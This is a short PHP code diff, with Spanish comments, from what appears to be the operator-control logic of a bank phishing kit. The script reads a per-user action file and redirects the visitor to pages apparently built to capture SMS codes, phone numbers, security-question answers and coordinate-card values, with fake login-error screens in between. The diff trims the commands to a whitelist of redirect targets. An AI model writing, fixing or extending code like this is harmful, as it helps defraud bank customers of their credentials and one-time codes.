@@ -9,39 +9,12 @@ $usuario = $_SESSION['usuario'];
 $archivo = "acciones/$usuario.txt";
 
 if (file_exists($archivo)) {
-    $accion = trim(file_get_contents($archivo));
-    unlink($archivo);
+    $destino = trim(file_get_contents($archivo));
+    unlink($archivo); // eliminamos después de usar
 
-    // Reemplazamos str_starts_with por substr()
-    if (substr($accion, 0, strlen("/palabra clave/")) === "/palabra clave/") {
-        $pregunta = explode("/palabra clave/", $accion)[1];
-        $_SESSION['pregunta'] = $pregunta;
-        header("Location: pregunta.php");
-        exit;
-    }
-
-    if (substr($accion, 0, strlen("/coordenadas etiquetas/")) === "/coordenadas etiquetas/") {
-        $etiquetas = explode("/login-error etiquetas/", $accion)[1];
-        $_SESSION['etiquetas'] = explode(",", $etiquetas);
-        header("Location: index2.php");
-        exit;
-    }
-
-    if ($accion == "/SMS") {
-        header("Location: sms.php");
-        exit;
-    }
-
-    if ($accion == "/SMSERROR") {
-        header("Location: smserror.php");
-        exit;
-    }
-    if ($accion == "/NUMERO") {
-        header("Location: numero.php");
-        exit;
-    }
-    if ($accion == "/ERROR") {
-        header("Location: loginerror.php");
+    // Solo redirige si el contenido es un archivo válido
+    if (in_array($destino, ['sms.php', 'smserror.php', 'index2.php'])) {
+        header("Location: $destino");
         exit;
     }
 }
